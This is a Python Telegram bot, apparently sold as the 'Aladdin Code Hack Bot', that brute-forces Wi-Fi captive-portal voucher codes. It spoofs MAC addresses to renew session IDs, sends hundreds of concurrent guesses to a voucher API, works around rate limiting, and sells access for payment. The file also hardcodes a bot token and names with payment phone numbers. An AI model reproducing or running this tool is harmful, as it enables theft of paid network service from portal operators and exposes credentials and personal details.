#!/usr/bin/env python3
import os
import re
import sys
import time
import string
import random
import asyncio
import aiohttp
import json
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, urljoin, urlencode, urlunparse

from telebot.async_telebot import AsyncTeleBot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# ---------------------- CONFIGURATION ----------------------
BOT_TOKEN = "8940069213:AAFyrS1SRM0XaR3mT53o_HGSk2J-TCpsDqc"
ADMIN_ID = 6417845887
DATA_FILE = "bot_data.json"

# Scanner Limits
PER_USER_CONCURRENCY = 300 
PER_SESSION_MAX = 90
TIMEOUT_SEC = 10

# ---------------------- DATA PERSISTENCE ----------------------
class DataManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.data = {
            "authorized_users": {},   # user_id: {"expiry": expiry_str, "daily_limit": int}
            "user_daily_hits": {},    # user_id: {date_str: hit_count}
            "users": {}               # user_id: { "urls": [], "tried_codes": [], "success_codes": [], "settings": {...} }
        }
        self.load()

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r') as f:
                    loaded_data = json.load(f)
                    for key in self.data:
                        if key in loaded_data:
                            self.data[key] = loaded_data[key]
            except Exception as e:
                print(f"Error loading data: {e}")
        self.save()

    def save(self):
        try:
            with open(self.file_path, 'w') as f:
                json.dump(self.data, f, indent=4)
        except Exception as e:
            print(f"Error saving data: {e}")

    def is_authorized(self, user_id):
        if user_id == ADMIN_ID:
            return True
        uid = str(user_id)
        if uid in self.data["authorized_users"]:
            user_info = self.data["authorized_users"][uid]
            expiry_str = user_info.get("expiry", "Expired")
            if expiry_str == "lifetime":
                return True
            try:
                expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry_date:
                    return True
                else:
                    self.deauthorize(user_id)
                    return False
            except:
                return False
        return False

    def get_user_info(self, user_id):
        if user_id == ADMIN_ID:
            return {"expiry": "♾️ Lifetime Admin", "daily_limit": "♾️ Unlimited"}
        uid = str(user_id)
        return self.data["authorized_users"].get(uid, {"expiry": "Expired", "daily_limit": 0})

    def authorize(self, user_id, days, daily_limit):
        uid = str(user_id)
        if days == "lifetime":
            expiry_str = "lifetime"
        else:
            expiry_date = datetime.now() + timedelta(days=int(days))
            expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
        
        self.data["authorized_users"][uid] = {
            "expiry": expiry_str,
            "daily_limit": int(daily_limit)
        }
        self.save()
        return expiry_str

    def deauthorize(self, user_id):
        uid = str(user_id)
        if uid in self.data["authorized_users"]:
            del self.data["authorized_users"][uid]
        if uid in self.data["users"]:
            del self.data["users"][uid]
        self.save()

    def check_and_add_hit(self, user_id):
        if user_id == ADMIN_ID:
            return True
        uid = str(user_id)
        today = datetime.now().strftime("%Y-%m-%d")
        user_info = self.get_user_info(user_id)
        max_limit = user_info.get("daily_limit", 10)

        if uid not in self.data["user_daily_hits"]:
            self.data["user_daily_hits"][uid] = {}
        
        current_hits = self.data["user_daily_hits"][uid].get(today, 0)
        if current_hits >= max_limit:
            return False
            
        self.data["user_daily_hits"][uid][today] = current_hits + 1
        self.save()
        return True

    def get_today_hits(self, user_id):
        uid = str(user_id)
        today = datetime.now().strftime("%Y-%m-%d")
        if uid in self.data["user_daily_hits"]:
            return self.data["user_daily_hits"][uid].get(today, 0)
        return 0

    def add_user_url(self, user_id, url):
        uid = str(user_id)
        if uid not in self.data["users"]:
            self.data["users"][uid] = {"urls": [], "tried_codes": [], "success_codes": [], "settings": {"char_set": "012345678", "code_len": 6}}
        
        if url not in self.data["users"][uid]["urls"]:
            self.data["users"][uid]["urls"].append(url)
            self.save()
            return True
        return False

    def get_user_data(self, user_id):
        uid = str(user_id)
        if uid not in self.data["users"]:
            self.data["users"][uid] = {"urls": [], "tried_codes": [], "success_codes": [], "settings": {"char_set": "012345678", "code_len": 6}}
        else:
            if "urls" not in self.data["users"][uid]:
                self.data["users"][uid]["urls"] = []
            if "tried_codes" not in self.data["users"][uid]:
                self.data["users"][uid]["tried_codes"] = []
            if "success_codes" not in self.data["users"][uid]:
                self.data["users"][uid]["success_codes"] = []
            if "settings" not in self.data["users"][uid]:
                self.data["users"][uid]["settings"] = {"char_set": "012345678", "code_len": 6}
        return self.data["users"][uid]

    def update_user_tried(self, user_id, code):
        uid = str(user_id)
        if uid in self.data["users"]:
            if code not in self.data["users"][uid]["tried_codes"]:
                self.data["users"][uid]["tried_codes"].append(code)
                if len(self.data["users"][uid]["tried_codes"]) > 10000:
                    self.data["users"][uid]["tried_codes"] = self.data["users"][uid]["tried_codes"][-10000:]
                self.save()

    def add_success_code(self, user_id, code):
        uid = str(user_id)
        self.get_user_data(user_id) # Ensure structure exists
        if code not in self.data["users"][uid]["success_codes"]:
            self.data["users"][uid]["success_codes"].append(code)
            self.save()

    def clear_success_codes(self, user_id):
        uid = str(user_id)
        if uid in self.data["users"] and "success_codes" in self.data["users"][uid]:
            self.data["users"][uid]["success_codes"] = []
            self.save()

    def clear_user_urls(self, user_id):
        uid = str(user_id)
        if uid in self.data["users"]:
            self.data["users"][uid]["urls"] = []
            self.save()

    def update_user_settings(self, user_id, setting_key, setting_value):
        uid = str(user_id)
        if uid in self.data["users"] and "settings" in self.data["users"][uid]:
            self.data["users"][uid]["settings"][setting_key] = setting_value
            self.save()

data_manager = DataManager(DATA_FILE)

# ---------------------- USER SESSION MANAGER ----------------------
class UserSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.stop_event = asyncio.Event()
        self.scan_task = None
        self.stats = {
            "total_tried": 0,
            "total_hits": 0,
            "current_code": "----",
            "start_time": 0
        }
        self.status_msg_id = None
        self.current_url_index = 0
        self.state = None 
        
    def reset_stats(self):
        self.stats = {
            "total_tried": 0,
            "total_hits": 0,
            "current_code": "----",
            "start_time": time.time()
        }
        self.stop_event.clear()

user_sessions = {}

def get_session(user_id) -> UserSession:
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    return user_sessions[user_id]

# ---------------------- SCANNING ENGINE ----------------------
bot = AsyncTeleBot(BOT_TOKEN)

def generate_random_mac():
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

async def get_sid_from_gateway(session, portal_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        query['mac'] = [generate_random_mac()]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
        
        async with session.get(spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
            return sid
    except Exception as e:
        print(f"Error getting SID from gateway {portal_url}: {e}")
        return None

async def worker_task(user_id, app_session):
    session = get_session(user_id)
    u_data = data_manager.get_user_data(user_id)
    urls = u_data["urls"]
    if not urls: 
        return

    char_set = u_data["settings"]["char_set"]
    code_len = u_data["settings"]["code_len"]
    tried_codes = set(u_data["tried_codes"])
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'
    }
    
    my_sid = None
    use_count = 0
    
    while not session.stop_event.is_set():
        if not data_manager.is_authorized(user_id):
            session.stop_event.set()
            await bot.send_message(user_id, "⚠️ <b>သင့်ရဲ့ သက်တမ်းကုန်ဆုံးသွားသောကြောင့် Scanner ကို ရပ်တန့်လိုက်ပါပြီ။</b>", parse_mode="HTML")
            break

        current_url = urls[session.current_url_index % len(urls)]
        base_url = f"{urlparse(current_url).scheme}://{urlparse(current_url).netloc}"

        if my_sid is None or use_count >= PER_SESSION_MAX:
            my_sid = await get_sid_from_gateway(app_session, current_url)
            if not my_sid:
                session.current_url_index += 1
                await asyncio.sleep(0.1)
                continue
            use_count = 0

        code = ''.join(random.choices(char_set, k=code_len))
        if code in tried_codes: 
            continue
        tried_codes.add(code)
        data_manager.update_user_tried(user_id, code)
        
        session.stats["current_code"] = code
        try:
            api_url = f"{base_url}/api/auth/voucher/"
            payload = {'accessCode': code, 'sessionId': my_sid, 'apiVersion': 1}
            
            async with app_session.post(api_url, json=payload, headers=headers, timeout=5, ssl=False) as r:
                session.stats["total_tried"] += 1
                use_count += 1
                res_text = (await r.text()).lower()
                
                if '"success":true' in res_text:
                    if data_manager.check_and_add_hit(user_id):
                        session.stats["total_hits"] += 1
                        data_manager.add_success_code(user_id, code) # Save found success code
                        await bot.send_message(user_id, f"✅ <b>FOUND SUCCESS CODE:</b> <code>{code}</code>", parse_mode="HTML")
                    else:
                        session.stop_event.set()
                        await bot.send_message(user_id, f"🚫 <b>ယနေ့အတွက် Success Code ရှာဖွေနိုင်မှု ကန့်သတ်ချက် ပြည့်သွားပြီဖြစ်၍ စကင်နာကို ရပ်တန့်လိုက်ပါပြီ။</b>", parse_mode="HTML")
                        break
                
                if "request limited" in res_text :
                    my_sid = None
        except Exception as e:
            my_sid = None
            await asyncio.sleep(0.1)

async def dashboard_updater(user_id):
    session = get_session(user_id)
    while not session.stop_event.is_set():
        if session.status_msg_id:
            elapsed = time.time() - session.stats["start_time"]
            speed = session.stats["total_tried"] / elapsed if elapsed > 0 else 0
            current_time_str = datetime.now().strftime("%I:%M:%S %p")
            today_hits = data_manager.get_today_hits(user_id)
            user_info = data_manager.get_user_info(user_id)
            max_limit = user_info.get("daily_limit", 10)
            
            text = (
                f"🔥 <b>ALADDIN IMMORTAL SCANNER V11</b> 🔥\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏰ <b>🕒 LIVE CLOCK:</b> <code>{current_time_str}</code>\n"
                f"🚀 <b>SPEED:</b> {speed:.1f} c/s\n"
                f"🏹 <b>TRIED:</b> {session.stats['total_tried']:,}\n"
                f"🎯 <b>HITS (TODAY):</b> {today_hits}/{max_limit} FOUND\n"
                f"🔑 <b>CURRENT TRY:</b> <code>{session.stats['current_code']}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ℹ️ <i>Results will be sent instantly. You can pause anytime.</i>"
            )
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton(text="🛑 STOP & PAUSE SCANNER", callback_data="stop_scan"))
            try:
                await bot.edit_message_text(chat_id=user_id, message_id=session.status_msg_id, text=text, reply_markup=markup, parse_mode="HTML")
            except Exception as e:
                session.status_msg_id = None
        await asyncio.sleep(3)

async def main_scanner_task(user_id):
    connector = aiohttp.TCPConnector(limit=PER_USER_CONCURRENCY,limit_per_host=0, ttl_dns_cache=300, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as app_session:
        tasks = [asyncio.create_task(dashboard_updater(user_id))]
        tasks.extend([asyncio.create_task(worker_task(user_id, app_session)) for _ in range(PER_USER_CONCURRENCY)])
        await asyncio.gather(*tasks)

# ---------------------- BOT KEYBOARD MENUS ----------------------

def get_user_keyboard(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(KeyboardButton("🔗 ADD PORTAL URL"), KeyboardButton("📄 MY URLS"))
    markup.add(KeyboardButton("⚙️ SETUP CONFIG MOD"), KeyboardButton("🚀 START SCAN"))
    markup.add(KeyboardButton("📄 MY SUCCESS CODES")) # New Keyboard Button added here
    if user_id == ADMIN_ID:
        markup.add(KeyboardButton("🔑 ADMIN PANEL"))
    return markup

def get_unauth_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(KeyboardButton("🛒 Access Key ဝယ်ယူရန်"))
    markup.add(KeyboardButton("💵 Ngwe Lwe Pyay Sar Po Yan"))
    return markup

def get_admin_panel_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add(KeyboardButton("👥 Admin ခွင့်ပြုပေးထားသော User များ"))
    markup.add(KeyboardButton("🚫 ခွင့်ပြုထားသော user များအား ပယ်ဖျက်ရန်"))
    markup.add(KeyboardButton("🔙 BACK TO MAIN"))
    return markup

@bot.message_handler(commands=['start'])
async def cmd_start(message):
    user_id = message.from_user.id
    session = get_session(user_id)
    session.state = None 

    if not data_manager.is_authorized(user_id):
        await bot.reply_to(
            message, 
            "✨ <b>မင်္ဂလာပါခင်ဗျာ</b> ၊ Bot ကို အသုံးပြုခွင့်မရှိသေးပါ ၊ ❌\n\n"
            "⚠️ <b>👉 ကျေးဇူးပြု၍ အောက်ပါ Menu မှတစ်ဆင့် ဝယ်ယူပါ</b> 👈", 
            reply_markup=get_unauth_keyboard(),
            parse_mode="HTML"
        )
        return

    user_info = data_manager.get_user_info(user_id)
    await bot.reply_to(
        message,
        f"👋 <b>Welcome back to Premium Aladdin Scanner Mode!</b>\n\n"
        f"👤 <b>Your ID:</b> <code>{user_id}</code>\n"
        f"⏳ <b>Valid Until:</b> <code>{user_info['expiry']}</code>\n"
        f"🎯 <b>Daily Max Limit:</b> <code>{user_info['daily_limit']} Hits</code>\n\n"
        f"✨ စက်ဝိုင်းစနစ်ဖြင့် စကင်ဖတ်ရန် အောက်ပါ Keyboard ခလုတ်များကို သုံးနိုင်ပါပြီ။",
        reply_markup=get_user_keyboard(user_id),
        parse_mode="HTML"
    )

# ---------------------- MESSAGE HANDLER FOR ALL INPUTS ----------------------
@bot.message_handler(content_types=['photo', 'text'])
async def handle_bot_inputs(message):
    user_id = message.from_user.id
    session = get_session(user_id)

    # 1. Processing Receipt Photo Upload (Photo Event)
    if message.content_type == 'photo':
        await bot.reply_to(
            message, 
            "📩 <b>Admin ထံသို့ ပို့ပေးနေပါသည် ၊ ခေတ္တ စောင့်ဆိုင်းပေးပါခင်ဗျာ။</b>\n\n"
            "⚜️ Admin မှ ခွင့်ပြုပြီးပါက Bot အား အသုံးပြုခွင့် ရလာပါမည်။ ကျေးဇူးတင်ပါတယ်! ✨"
        )
        
        username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
        admin_alert = (
            "📥 <b>[ငွေလွှဲပြေစာ အသစ်ရောက်ရှိလာပါသည်]</b> 📥\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>User:</b> {message.from_user.first_name}\n"
            f"🆔 <b>Telegram ID:</b> <code>{user_id}</code>\n"
            f"🔗 <b>Username:</b> {username}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚡ <b>[Admin အတည်ပြုပေးရန် ရိုက်ထည့်ရမည့် ပုံစံ]</b>\n"
            f"<code>{user_id} | ရက်အရေအတွက် | နေ့စဉ် Limit</code>\n\n"
            "<i>✍️ ဥပမာ - ၁လစာအတွက် အောက်ပါအတိုင်း ကူးယူ၍ ရိုက်ပို့ပါ-</i>\n"
            f"<code>{user_id} | 30 | 10</code>"
        )
        await bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=admin_alert, parse_mode="HTML")
        return

    # 2. Text Input Logic
    if message.content_type == 'text':
        text_data = message.text.strip()

        # --- ADMIN DIRECT ACTIVATION COMMAND LOGIC ---
        if user_id == ADMIN_ID and "|" in text_data:
            parts = [p.strip() for p in text_data.split("|")]
            if len(parts) == 3:
                try:
                    target_id = int(parts[0])
                    days_input = parts[1]
                    daily_limit = int(parts[2])
                    
                    expiry_result = data_manager.authorize(target_id, days_input, daily_limit)
                    
                    await bot.reply_to(
                        message, 
                        f"✅ <b>User အား အောင်မြင်စွာ ခွင့်ပြုလိုက်ပါပြီ။</b>\n\n"
                        f"🆔 <b>User ID:</b> <code>{target_id}</code>\n"
                        f"⏳ <b>Expiry:</b> <code>{expiry_result}</code>\n"
                        f"🎯 <b>Daily Limit:</b> <code>{daily_limit} Hits</code>",
                        reply_markup=get_admin_panel_keyboard() if text_data.startswith(str(ADMIN_ID)) else None,
                        parse_mode="HTML"
                    )
                    
                    try:
                        await bot.send_message(
                            target_id,
                            f"🎉 <b>Admin ထံမှ ခွင့်ပြုချက် ရပါပီ ခင်မျာ၊ သင့် Key သက်တမ်းမှာ-</b>\n\n"
                            f"🆔 <b>User ID:</b> <code>{target_id}</code>\n"
                            f"⏳ <b>Expired Time:</b> <code>{expiry_result}</code>\n"
                            f"🎯 <b>Daily Success Code Limit:</b> <code>{daily_limit} Hits</code>",
                            reply_markup=get_user_keyboard(target_id),
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        await bot.reply_to(message, f"⚠️ User ထံ စာပို့၍မရပါ (Bot အား Start မလုပ်ရသေးပါ)။")
                    return
                except ValueError:
                    await bot.reply_to(message, "❌ <b>ရိုက်ထည့်သော Format လွဲမှားနေပါသည်။</b> ID နှင့် Limit ကို ကိန်းဂဏန်းများဖြင့်သာ သေချာထည့်ပေးပါ။")
                    return

        # --- ADMIN BAN COMMAND LOGIC ---
        if user_id == ADMIN_ID and session.state == "waiting_for_ban_id":
            try:
                target_ban_id = int(text_data)
                if str(target_ban_id) in data_manager.data["authorized_users"]:
                    data_manager.deauthorize(target_ban_id)
                    
                    if target_ban_id in user_sessions:
                        us = user_sessions[target_ban_id]
                        us.stop_event.set()
                        if us.scan_task: us.scan_task.cancel()
                        del user_sessions[target_ban_id]
                        
                    await bot.reply_to(message, f"✅ <b>User {target_ban_id} အား အောင်မြင်စွာ ပယ်ဖျက်ပြီးပါပြီ။</b>", reply_markup=get_admin_panel_keyboard(), parse_mode="HTML")
                else:
                    await bot.reply_to(message, "❌ အဆိုပါ ID မှာ ခွင့်ပြုထားသော စာရင်းထဲတွင် မရှိပါ။")
            except:
                await bot.reply_to(message, "❌ တရားဝင်သော numeric ID ကိုသာ ရိုက်ထည့်ပါ။")
            session.state = None
            return

        # --- USER INPUT PORTAL URL ---
        if session.state == "waiting_for_url":
            if not (text_data.startswith("http://") or text_data.startswith("https://")):
                await bot.reply_to(message, "❌ Invalid URL. Must start with http:// or https://")
            elif data_manager.add_user_url(user_id, text_data):
                await bot.reply_to(message, "✅ URL added successfully!", reply_markup=get_user_keyboard(user_id))
            else:
                await bot.reply_to(message, "⚠️ This URL is already in your list.", reply_markup=get_user_keyboard(user_id))
            session.state = None
            return

        # --- PUBLIC COMMANDS / UN-AUTHORIZED KEYBOARD ---
        if text_data == "🛒 Access Key ဝယ်ယူရန်":
            text = (
                "⚡ <b>Aladdin Code Hack Bot ဈေးနှုန်းများ</b> ⚡\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "📅 <b>15 Days</b> - <code>15,000 Ks</code>\n"
                "📅 <b>30 Days</b> - <code>21,000 Ks</code>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "💰 <b>ငွေလွှဲရန် - KPay</b>\n"
                "📱 <code>09973214939</code>\n"
                "👤 <b>Hein Min Thant</b>\n\n"
                "💰 <b>ငွေလွှဲရန် - Wave</b>\n"
                "📱 <code>09264389341</code>\n"
                "👤 <b>Hein Min Chit</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "⚠️ Ngwe Lwe Pyay Sar Po Yan ခလုတ်နှိပ်၍ ပေးပို့ပေးပါဦးခင်ဗျာ။"
            )
            await bot.reply_to(message, text, parse_mode="HTML")
            return
            
        elif text_data == "💵 Ngwe Lwe Pyay Sar Po Yan":
            await bot.reply_to(message, "📸 <b>ကျေးဇူးပြု၍ Ngwe Lwe Pyay Sar (Screenshot Photo) အား တိုက်ရိုက် ပို့ပေးပါခင်ဗျာ။</b>")
            return

        # Core Authorize Gate for menus
        if not data_manager.is_authorized(user_id):
            await bot.reply_to(message, "❌ သင့်တွင် ဤ Bot အား သုံးခွင့်မရှိသေးပါ။ ပြေစာ ပေးပို့ပေးပါ။", reply_markup=get_unauth_keyboard())
            return

        # --- STANDARD KEYBOARD NAVIGATION ---
        if text_data == "🔗 ADD PORTAL URL":
            session.state = "waiting_for_url"
            await bot.reply_to(message, "Please send the Portal URL you want to add.")
            
        elif text_data == "📄 MY URLS":
            u_data = data_manager.get_user_data(user_id)
            urls = u_data["urls"]
            if not urls:
                text = "You haven't added any URLs yet."
                markup = None
            else:
                text = "<b>Your URLs:</b>\n\n" + "\n".join([f"{i+1}. {u[:70]}..." for i, u in enumerate(urls)])
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton(text="🗑 CLEAR ALL URLS", callback_data="clear_urls"))
            await bot.reply_to(message, text, reply_markup=markup, parse_mode="HTML")

        # New Keyboard Logic to View Saved Success Codes
        elif text_data == "📄 MY SUCCESS CODES":
            u_data = data_manager.get_user_data(user_id)
            success_list = u_data.get("success_codes", [])
            if not success_list:
                text = "⚠️ <b>သင့်ထံတွင် ရှာဖွေတွေ့ရှိထားသော Success Code မရှိသေးပါခင်ဗျာ။</b>"
                markup = None
            else:
                text = "🎯 <b>သင်ရှာဖွေတွေ့ရှိထားသော Success Codes များ-</b>\n"
                text += "<i>(စာလုံးပေါ်ဖိရုံဖြင့် အလွယ်တကူ Copy ကူးယူနိုင်ပါသည်)</i>\n\n"
                for i, code in enumerate(success_list):
                    text += f"{i+1}. <code>{code}</code>\n"
                
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton(text="🗑 CLEAR SUCCESS CODES (ဖျက်ပစ်ရန်)", callback_data="clear_success_codes"))
            await bot.reply_to(message, text, reply_markup=markup, parse_mode="HTML")
            
        elif text_data == "⚙️ SETUP CONFIG MOD":
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton(text="🔢 Numbers (0-8)", callback_data="set_m_num"))
            markup.row(InlineKeyboardButton(text="🔤 Alpha (a-z)", callback_data="set_m_alpha"))
            markup.row(InlineKeyboardButton(text="🔀 Mixed", callback_data="set_m_mixed"))
            await bot.reply_to(message, "Select Character Set:", reply_markup=markup)
            
        elif text_data == "🚀 START SCAN":
            u_data = data_manager.get_user_data(user_id)
            if not u_data["urls"]:
                await bot.reply_to(message, "⚠️ Add at least one URL first!")
                return
            
            today_hits = data_manager.get_today_hits(user_id)
            user_info = data_manager.get_user_info(user_id)
            max_limit = user_info.get("daily_limit", 10)
            
            # Admin ဖြစ်ခဲ့ရင် Limit Check ကို ကျော်သွားစေချင်ရင် (သို့) ♾️ အမြဲအလုပ်လုပ်စေချင်ရင်
            if user_id != ADMIN_ID and today_hits >= max_limit:
                await bot.reply_to(message, f"⚠️ ယနေ့အတွက် သတ်မှတ်ထားသော အမြင့်ဆုံး Limit ({max_limit}) ပြည့်သွားပါပြီ။")
                return

            if session.scan_task and not session.scan_task.done():
                await bot.reply_to(message, "⚠️ Scanner is already running.")
                return
            
            session.reset_stats()
            status_msg = await bot.reply_to(message, "🚀 Initializing Scanner Dashboard...", parse_mode="HTML")
            session.status_msg_id = status_msg.message_id
            session.scan_task = asyncio.create_task(main_scanner_task(user_id))

        elif text_data == "🔑 ADMIN PANEL" and user_id == ADMIN_ID:
            session.state = None
            await bot.reply_to(message, "👑 <b>WELCOME TO ADMIN MASTER SYSTEM</b>", reply_markup=get_admin_panel_keyboard(), parse_mode="HTML")

        elif text_data == "👥 Admin ခွင့်ပြုပေးထားသော User များ" and user_id == ADMIN_ID:
            users = data_manager.data["authorized_users"]
            if not users:
                await bot.reply_to(message, "လက်ရှိတွင် ခွင့်ပြုထားသော User မရှိသေးပါ။")
                return
            report = "👥 <b>ခွင့်ပြုထားသော User စာရင်း-</b>\n\n"
            for uid, info in users.items():
                report += f"• <code>{uid}</code> | {info.get('expiry')} | Limit: {info.get('daily_limit')} Hits\n"
            await bot.reply_to(message, report, parse_mode="HTML")

        elif text_data == "🚫 ခွင့်ပြုထားသော user များအား ပယ်ဖျက်ရန်" and user_id == ADMIN_ID:
            users = data_manager.data["authorized_users"]
            if not users:
                await bot.reply_to(message, "ပယ်ဖျက်ရန် User စာရင်း မရှိသေးပါ။")
                return
            
            report = "🚫 <b>လက်ရှိအသုံးပြုနေသော User ID များ-</b>\n\n"
            for uid, info in users.items():
                report += f"• <code>{uid}</code> ({info.get('expiry')})\n"
            
            report += "\n━━━━━━━━━━━━━━━━━━━━━━━\n"
            report += "✍️ <b>ပယ်ဖျက်လိုပါက အောက်ပါအတိုင်း ID တစ်ခုတည်းကို သီးသန့် ရိုက်ပို့ပေးပါ-</b>\n"
            report += "ဥပမာ - <code>685224104</code>"
            
            session.state = "waiting_for_ban_id"
            await bot.reply_to(message, report, parse_mode="HTML")

        elif text_data == "🔙 BACK TO MAIN" or text_data == "🔙 BACK":
            session.state = None
            await bot.reply_to(message, "Main Menu သို့ ပြန်ရောက်ပါပြီ။", reply_markup=get_user_keyboard(user_id))

# ---------------------- INLINE CALLBACK BUTTONS HANDLERS ----------------------
@bot.callback_query_handler(func=lambda call: call.data == "clear_success_codes")
async def inline_clear_success_codes(call):
    user_id = call.from_user.id
    data_manager.clear_success_codes(user_id)
    await bot.answer_callback_query(call.id, "Success Codes အားလုံးကို ဖျက်ပြီးပါပြီ။", show_alert=True)
    await bot.edit_message_text("🗑 <b>ရှာဖွေထားသော Success Code အားလုံးကို သန့်ရှင်းဖျက်ဆီးပြီးပါပြီ။</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "clear_urls")
async def inline_clear_urls(call):
    user_id = call.from_user.id
    data_manager.clear_user_urls(user_id)
    await bot.answer_callback_query(call.id, "All URLs cleared!")
    await bot.edit_message_text("🗑 All URLs have been deleted successfully.", chat_id=call.message.chat.id, message_id=call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "stop_scan")
async def inline_stop_scan(call):
    user_id = call.from_user.id
    session = get_session(user_id)
    session.stop_event.set()
    if session.scan_task:
        session.scan_task.cancel()
        try: await session.scan_task
        except asyncio.CancelledError: pass
    session.scan_task = None
    await bot.answer_callback_query(call.id, "🛑 Scanner paused.")
    await bot.edit_message_text("🛑 <b>Scanner Stopped & Paused Successfully!</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "set_m_num")
async def cb_set_m_num(call):
    user_id = call.from_user.id
    data_manager.update_user_settings(user_id, "char_set", "012345678")
    await prompt_length_selection(call)

@bot.callback_query_handler(func=lambda call: call.data == "set_m_alpha")
async def cb_set_m_alpha(call):
    user_id = call.from_user.id
    data_manager.update_user_settings(user_id, "char_set", string.ascii_lowercase)
    await prompt_length_selection(call)

@bot.callback_query_handler(func=lambda call: call.data == "set_m_mixed")
async def cb_set_m_mixed(call):
    user_id = call.from_user.id
    data_manager.update_user_settings(user_id, "char_set", "012345678" + string.ascii_lowercase)
    await prompt_length_selection(call)

async def prompt_length_selection(call):
    markup = InlineKeyboardMarkup()
    for i in [6, 7, 8]:
        markup.row(InlineKeyboardButton(text=f"{i} Digits", callback_data=f"set_l_{i}"))
    await bot.edit_message_text("Select Code Length:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("set_l_"))
async def cb_set_len(call):
    user_id = call.from_user.id
    length = int(call.data.split("_")[-1])
    data_manager.update_user_settings(user_id, "code_len", length)
    await bot.answer_callback_query(call.id, "Settings updated successfully!")
    await bot.edit_message_text("⚙️ <b>Config settings saved! Ready to scan.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")

# ---------------------- STARTING THE PLATFORM ----------------------
async def main():
    print("[*] Starting Premium Aladdin Code Hack Bot Platform...")
    await bot.polling(non_stop=True)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Bot Closed Safely.")
        sys.exit(0)
